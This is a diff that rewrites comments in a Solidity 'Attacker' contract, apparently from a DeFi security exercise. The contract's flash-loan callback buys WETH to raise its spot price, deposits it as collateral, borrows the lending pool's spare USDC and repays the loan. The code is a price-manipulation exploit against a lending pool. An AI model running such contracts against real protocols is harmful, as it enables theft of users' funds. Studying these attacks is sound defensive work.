@@ -30,10 +30,13 @@ contract Attacker {
         lender.flashLoan(this, flashAmount);
     }
 
-    /// @notice Uses flash-borrowed USDC to manipulate the price, borrow, and repay the flash loan.
-    /// @dev Starts with 10 WETH supplied as collateral and the USDC received from the flash lender.
-    /// @param amount Flash-borrowed USDC amount.
-    /// @param fee Additional USDC required to repay the flash loan.
+    /// @notice Buys WETH to raise its spot price, deposits 10 WETH, borrows the available USDC,
+    /// sells the purchased WETH back, and repays the flash loan plus its fee.
+    /// @dev Only the configured flash lender may call this callback, after transferring the USDC.
+    /// The attacker must already hold 10 WETH to deposit as collateral; these remain in the lending pool.
+    /// Borrowing capacity depends on the lending pool's oracle: the saved TWAP is unchanged by these swaps.
+    /// @param amount Flash-borrowed USDC principal, in raw token units (6 decimals).
+    /// @param fee Additional USDC owed to the flash lender, in raw token units (6 decimals).
     function onFlashLoan(uint256 amount, uint256 fee) external {
         // 1. Checks the caller is the configured flash lender.
         require(msg.sender == address(lender), "Invalid lender");
@@ -53,7 +56,7 @@ contract Attacker {
         pool.deposit(10 ether);
         // This line calculates how much more USDC the attacker can borrow:
         // - borrowLimit(...): the maximum total debt allowed by the current collateral value.
-        // - debt(...): the USDC already owed.
+        // - pool.debt(...): the USDC already owed.
         // - The difference: the unused borrowing capacity.
         borrowed = pool.borrowLimit(address(this)) - pool.debt(address(this));
         pool.borrow(borrowed);
